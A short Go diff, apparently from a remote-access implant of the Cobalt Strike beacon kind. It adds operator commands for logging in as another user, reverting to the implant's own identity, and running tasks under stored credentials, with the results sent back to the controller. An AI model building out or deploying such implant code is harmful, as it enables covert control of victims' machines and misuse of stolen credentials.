@@ -243,6 +243,14 @@ func main() {
 										packet.ParseSocksTraffic(cmdBuf)
 									case packet.CMD_TYPE_SOCKS_DIE:
 										packet.ParseSocksDie(cmdBuf)
+									case packet.CMD_TYPE_LOGIN_USER:
+										packet.ParseLoginUser(cmdBuf)
+									case packet.CMD_TYPE_REVTOSELF:
+										config.StoredCredentials = nil
+									case packet.CMD_TYPE_RUNAS:
+										result := packet.ParseRunAs(cmdBuf)
+										finalPacket := packet.MakePacket(0, result)
+										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
 									default:
